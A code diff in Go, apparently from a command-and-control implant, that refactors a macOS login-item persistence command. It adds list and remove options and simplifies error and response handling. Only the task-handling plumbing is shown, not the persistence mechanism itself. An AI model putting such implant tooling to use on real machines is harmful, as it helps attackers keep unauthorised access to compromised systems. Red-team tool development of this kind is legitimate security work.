@@ -13,41 +13,24 @@ type Arguments struct {
 	Path   string `json:"path"`
 	Name   string `json:"name"`
 	Global bool   `json:"global"`
+	List   bool   `json:"list"`
+	Remove bool   `json:"remove"`
 }
 
 func Run(task structs.Task) {
-	msg := structs.Response{}
-	msg.TaskID = task.TaskID
+	msg := task.NewResponse()
 
 	args := Arguments{}
 	err := json.Unmarshal([]byte(task.Params), &args)
 
 	if err != nil {
-		msg.UserOutput = err.Error()
-		msg.Completed = true
-		msg.Status = "error"
+		msg.SetError(err.Error())
 		task.Job.SendResponses <- msg
 		return
 	}
-
-	r, err := runCommand(args.Path, args.Name, args.Global)
-	if err != nil {
-		msg.UserOutput = err.Error()
-		msg.Completed = true
-		msg.Status = "error"
-		task.Job.SendResponses <- msg
-		return
-	}
-
-	if r.Successful {
-		msg.UserOutput = "persistence installed"
-		msg.Completed = true
-		task.Job.SendResponses <- msg
-	} else {
-		msg.UserOutput = "failed to install login item persistence"
-		msg.Completed = true
-		task.Job.SendResponses <- msg
-	}
-
+	r := runCommand(args.Path, args.Name, args.Global, args.List, args.Remove)
+	msg.UserOutput = r.Message
+	msg.Completed = true
+	task.Job.SendResponses <- msg
 	return
 }
